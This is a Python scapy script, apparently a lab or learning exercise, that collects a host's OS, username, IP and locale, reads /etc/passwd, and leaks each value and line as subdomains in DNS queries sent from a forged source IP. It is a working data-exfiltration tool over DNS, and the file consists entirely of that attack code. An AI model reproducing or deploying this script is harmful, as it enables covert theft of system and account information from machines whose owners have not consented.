from scapy.all import *
import platform 
import getpass
import socket
import locale
import time
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
import netifaces


SOURCE_IP = '1.2.3.4'

DEST_IP = '127.0.0.1'

#    if (os.name == "posix"): # linux
#         with open("/etc/passwd", "rb") as f:
#             pass_file = f.read()
#         available_languages = locale.locale_alias.keys()
#         user_language, _ = locale.getdefaultlocale()
#         version = os.uname().nodename
#     else: # windows
#         #with open("C:\\Windows\\System32\\config", "rb") as f: #  Permission denied: 'C:\\Windows\\System32\\config'
#         #    pass_file = f.read()
#         pass_file = " "
#         available_languages = locale.windows_locale.values()
#         user_language, _ = locale.getdefaultlocale()
#         version = sys.getwindowsversion().platform_version
#         version = '.'.join(map(str, sys.getwindowsversion().platform_version))


# This function returns the details of the system
def get_details(): 
    os = platform.system()
    os_version = platform.release()
    user = getpass.getuser()
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    language = locale.getdefaultlocale()

    return os, os_version, user, ip, language[0]

# This function returns the contents of the password file
def get_password_file():
    os = platform.system()
    try:
        if os == 'Linux':
            return open('/etc/passwd', 'r').readlines()
    except:
        return ""

# This function sends the DNS query to the server with the details of the system
def send_dns_query():
    
    details = get_details() # Get the details of the system
    file_contents = get_password_file() # Get the contents of the password file

    ip = IP(src=SOURCE_IP, dst=DEST_IP) 
    udp = UDP(sport=RandShort(), dport=53) 

    for detail in details: # For each detail, send a DNS query
        site = detail+'.google.com'
        print(site)
        dns = DNS(rd=1, qd=DNSQR(qname=site)) 
        packet = ip/udp/dns 
        send(packet, verbose=0) 
        time.sleep(1) 

    for line in file_contents:
        site = line+'.google.com'
        print(site)
        dns = DNS(rd=1, qd=DNSQR(qname=site)) 
        packet = ip/udp/dns 
        send(packet, verbose=0)
        time.sleep(1)


if __name__ == '__main__':
    send_dns_query()
